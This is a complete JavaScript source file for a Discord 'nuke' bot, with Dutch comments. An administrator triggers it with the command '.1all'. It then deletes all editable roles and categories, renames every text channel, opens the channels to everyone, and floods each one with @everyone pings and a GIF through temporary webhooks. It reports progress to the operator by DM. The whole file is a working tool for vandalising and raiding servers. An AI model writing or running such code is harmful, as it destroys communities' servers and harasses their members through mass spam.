import { Client, GatewayIntentBits, PermissionsBitField, ChannelType } from 'discord.js';
import http from 'http';

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const PREFIX = '.1';
const GIF_URL = "https://cdn.discordapp.com/attachments/1522698849276268634/1522701428466909326/togif.gif";

http.createServer((req, res) => res.end('Bot running!')).listen(3000);

client.once('ready', () => {
    console.log(`✅ Bot is online als ${client.user.tag}`);
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;

    if (!message.content.toLowerCase().startsWith('.1all')) return;

    const args = message.content.slice(5).trim().split(/ +/);
    const spamAmount = parseInt(args[0]) || 50;

    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply("❌ Administrator rechten nodig!").then(m => setTimeout(() => m.delete().catch(() => {}), 3000));
    }

    // Verwijder het commando meteen
    message.delete().catch(() => {});

    try {
        await message.author.send(`⚠️ **NUKE START** ⚠️\nSpam: ${spamAmount}x per channel`);
    } catch {}

    let cancelled = false;
    const collector = message.channel.createMessageCollector({
        filter: m => m.author.id === message.author.id && m.content.toLowerCase() === '.1cancel',
        time: 4000
    });
    collector.on('collect', () => cancelled = true);

    await new Promise(r => setTimeout(r, 4000));
    if (cancelled) return;

    // Rollen verwijderen
    for (const role of message.guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).values()) {
        try { await role.delete(); } catch {}
    }

    // Categorieën verwijderen
    for (const cat of message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildCategory).values()) {
        try { await cat.delete(); } catch {}
    }

    // Channels bewerken + Webhook spam
    let processed = 0;

    for (const channel of message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).values()) {
        try {
            await channel.setName("Finnson the goat");

            // Zichtbaarheid
            await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                ViewChannel: true,
                SendMessages: true,
                ReadMessageHistory: true
            }).catch(() => {});

            // Webhook maken en spammen
            const webhook = await channel.createWebhook({
                name: "Idk who Im",
                avatar: "https://pfps.gg/pfp/3433-aesthetic-scary" // optioneel
            }).catch(() => null);

            if (webhook) {
                for (let i = 0; i < spamAmount; i++) {
                    await webhook.send({
                        content: `@everyone\n${GIF_URL}`,
                        username: "Finnson the goat",
                        avatarURL: "https://i.imgur.com/removed.png"
                    }).catch(() => {});
                }
                // Webhook weer verwijderen (optioneel)
                webhook.delete().catch(() => {});
            }

            processed++;
        } catch (err) {}
    }

    // Eindresultaat in DM
    try {
        await message.author.send(`[DONE] ${processed} channels changed`);
    } catch {
        // fallback
    }
});

client.login(process.env.TOKEN);
